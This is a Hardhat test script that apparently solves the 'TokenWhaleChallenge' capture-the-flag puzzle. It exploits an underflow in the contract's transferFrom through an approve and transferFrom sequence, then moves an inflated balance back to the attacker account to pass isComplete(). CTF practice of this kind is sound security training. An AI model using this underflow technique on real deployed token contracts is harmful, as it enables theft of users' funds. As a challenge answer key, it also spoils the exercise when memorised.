import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  let firstAccount: SignerWithAddress;
  let secondAccount: SignerWithAddress;

  before(async () => {
    [attacker, deployer, firstAccount, secondAccount] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const approveTx = await target.approve(firstAccount.address, 1000);
    await approveTx.wait();

    const transferTx = await target.connect(firstAccount).transferFrom(attacker.address, secondAccount.address, 1000);
    await transferTx.wait();

    // NOTE: 2000000 is just a random number to satisfy the isComplete
    await target.connect(firstAccount).transfer(attacker.address, '2000000');

    expect(await target.isComplete()).to.equal(true);
  });
});
